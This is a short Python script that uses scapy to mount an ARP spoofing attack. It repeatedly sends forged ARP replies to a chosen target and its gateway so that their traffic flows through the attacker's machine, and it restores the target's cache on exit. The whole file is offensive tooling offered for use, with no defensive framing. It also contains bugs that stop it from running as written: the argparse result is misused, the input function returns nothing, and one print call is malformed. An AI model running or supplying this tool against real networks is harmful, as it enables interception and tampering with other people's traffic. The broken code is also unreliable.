import scapy.all as scapy
import argparse
import time

def get_inputs():
    user_inputs = argparse.ArgumentParser()
    user_inputs.add_argument("-t","--target",dest="target_ip",help="example -t 192.168.1.10")
    user_inputs.add_argument("-g","--gateway",dest="gateway_ip",help="example -g 192.168.1.1")
    answer_input = user_inputs.parse_args()[0]
    if not answer_input.target_ip:
        print("please enter target ip address")
    else:
        print("please enter gateway ip address")


def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc



def arp_response(target_add,gateway_add):
    mac_add_res = get_mac_address(target_add)
    response_arp = scapy.ARP(op=2,pdst=target_add,hwdst=mac_add_res,psrc=gateway_add)
    scapy.send(response_arp,verbose=False)

def reset_poison(target_add,gateway_add):
    mac_add_res = get_mac_address(target_add)
    mac_add_res2 = get_mac_address(gateway_add)
    response_arp = scapy.ARP(op=2,pdst=target_add,hwdst=mac_add_res,psrc=gateway_add,hwsrc=mac_add_res2)
    scapy.send(response_arp,verbose=False)



inputs_user = get_inputs()
num=2

try:
    while True:
        num+=2
        first_packet = arp_response(inputs_user.target_ip,inputs_user.gateway_ip)
        second_packet = arp_response(inputs_user.gateway_ip,inputs_user.target_ip)
        time.sleep(7)
        print("\rSending packets " ,end=num)
except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_poison(inputs_user.target_ip,inputs_user.gateway_ip)



